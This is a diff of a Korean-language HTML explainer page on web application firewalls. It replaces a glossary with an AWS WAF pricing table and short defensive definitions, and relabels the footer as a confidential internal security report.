+                        <div class="text-indigo-400 mb-4"><i data-lucide="layout-grid" class="w-8 h-8"></i></div>
+                        <h4 class="font-bold text-slate-100 mb-4 uppercase text-sm tracking-widest">Web ACL Hierarchical Logic</h4>
+                        <p class="text-xs text-slate-400 leading-relaxed">
+                            국가별 IP 차단(Geo-blocking), SQLi 방지, Rate Limit(속도 제한) 등을 계층화하여 적용합니다.
                         </p>
                     </div>
                 </div>
-            </div>
-        </section>
 
-        <!-- Section 5: Glossary (주석 및 용어 설명) -->
-        <section>
-            <h2 class="text-2xl font-black border-l-4 border-slate-600 pl-4 text-slate-400 mb-8 tracking-tight uppercase">
-                5. 상세 설명 주석 (Glossary)
-            </h2>
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                <div class="p-4 bg-slate-900/80 rounded-xl border border-slate-800 text-xs text-slate-400">
-                    <strong class="text-slate-200 block mb-1">1. L7 (Application Layer)</strong>
-                    OSI 7계층 중 최상위 계층으로, HTTP, FTP, SMTP 등 사용자가 직접 접하는 프로토콜이 동작하는 영역입니다.
+                <!-- AWS Pricing Table -->
+                <div class="border border-red-900/50 bg-red-950/10 rounded-3xl p-8">
+                    <h4 class="text-xl font-black text-red-400 uppercase italic underline mb-8 flex items-center gap-2">
+                        <i data-lucide="banknote"></i> AWS WAF Pricing Policy (과금 가이드)
+                    </h4>
+                    <div class="space-y-4">
+                        <div class="flex justify-between items-center p-4 bg-slate-900/50 rounded-xl border border-red-900/20">
+                            <div><span class="text-slate-100 font-bold block">Web ACL Subscription</span><span class="text-[10px] text-slate-500">생성된 웹 접근 제어 목록당 비용</span></div>
+                            <span class="text-red-400 font-mono font-black">$5.00 / month</span>
+                        </div>
+                        <div class="flex justify-between items-center p-4 bg-slate-900/50 rounded-xl border border-red-900/20">
+                            <div><span class="text-slate-100 font-bold block">Rule Add-on</span><span class="text-[10px] text-slate-500">추가된 보안 규칙 1개당 비용</span></div>
+                            <span class="text-red-400 font-mono font-black">$1.00 / month</span>
+                        </div>
+                        <div class="flex justify-between items-center p-4 bg-slate-900/50 rounded-xl border border-red-900/20">
+                            <div><span class="text-slate-100 font-bold block">Request Processing</span><span class="text-[10px] text-slate-500">처리된 웹 요청 100만 건당 비용</span></div>
+                            <span class="text-red-400 font-mono font-black">$0.60 / per million</span>
+                        </div>
+                    </div>
                 </div>
-                <div class="p-4 bg-slate-900/80 rounded-xl border border-slate-800 text-xs text-slate-400">
-                    <strong class="text-slate-200 block mb-1">2. OWASP Top 10</strong>
-                    웹 애플리케이션 보안에서 가장 빈번하게 발생하는 10가지 위험 요소에 대한 표준 가이드라인입니다.
-                </div>
-                <div class="p-4 bg-slate-900/80 rounded-xl border border-slate-800 text-xs text-slate-400">
-                    <strong class="text-slate-200 block mb-1">3. ModSecurity</strong>
-                    웹 서버 모듈 형태로 동작하며 패킷의 헤더와 바디를 실시간으로 필터링하는 방화벽 엔진입니다.
-                </div>
-                <div class="p-4 bg-slate-900/80 rounded-xl border border-slate-800 text-xs text-slate-400">
-                    <strong class="text-slate-200 block mb-1">4. Web ACL (Web Access Control List)</strong>
-                    웹 요청을 허용, 차단 또는 모니터링할지 결정하는 규칙들의 집합입니다.
-                </div>
-                <div class="p-4 bg-slate-900/80 rounded-xl border border-slate-800 text-xs text-slate-400 col-span-1 md:col-span-2">
-                    <strong class="text-slate-200 block mb-1">5. ALB (Application Load Balancer)</strong>
-                    여러 대의 서버로 트래픽을 분산시켜주는 장치로, L7 계층에서 동작하므로 WAF와 직접 연동됩니다.
+
+                <!-- 상세 주석 (Section 5) -->
+                <div class="annotation-box rounded-xl p-6 mt-8">
+                    <div class="text-xs text-slate-400 leading-relaxed">
+                        <ul class="list-disc pl-4 space-y-2">
+                            <li><strong>Zero-day Attack (제로데이 공격):</strong> 보안 취약점이 발견된 후 공식 패치가 나오기 전에 시도되는 미지의 공격입니다.</li>
+                            <li><strong>Rate Limit (속도 제한):</strong> 특정 시간 동안 들어오는 요청 수를 제한하여 무차별 대입 공격(Brute-force)이나 DDoS를 방어하는 기술입니다.</li>
+                        </ul>
+                    </div>
                 </div>
             </div>
         </section>
@@ -307,11 +359,11 @@
     </main>
 
     <footer class="max-w-6xl mx-auto px-6 py-12 border-t border-slate-800 text-center">
-        <div class="text-slate-500 font-mono text-[10px] tracking-widest uppercase mb-4">
-            © 2026 System Architect Pro. All rights reserved.
+        <div class="text-slate-500 font-mono text-[10px] tracking-widest uppercase mb-4 italic underline decoration-slate-700">
+            CONFIDENTIAL - Internal Security Report © 2026 System Architect Pro
         </div>
-        <p class="text-slate-600 text-[10px] leading-relaxed max-w-2xl mx-auto italic">
-            본 실습 자료는 웹 보안 강화의 실무적 이해를 돕기 위해 제작되었습니다. 실무 적용 시 반드시 스테이징 환경에서 규칙의 오탐 여부를 검증한 후 운영 환경에 배포하십시오.
+        <p class="text-slate-600 text-[10px] leading-relaxed max-w-2xl mx-auto">
+            본 보고서는 보안 점검 결과를 바탕으로 작성된 공식 가이드라인입니다. 외부 유출 시 법적 책임이 발생할 수 있으며, 실제 인프라 적용 전 반드시 스테이징 환경에서의 전수 검사가 필요합니다.
         </p>
         <div class="mt-8 text-cyan-500 font-black text-sm tracking-widest">
             Next Step: 감사 로그 관리 및 중앙 집중화
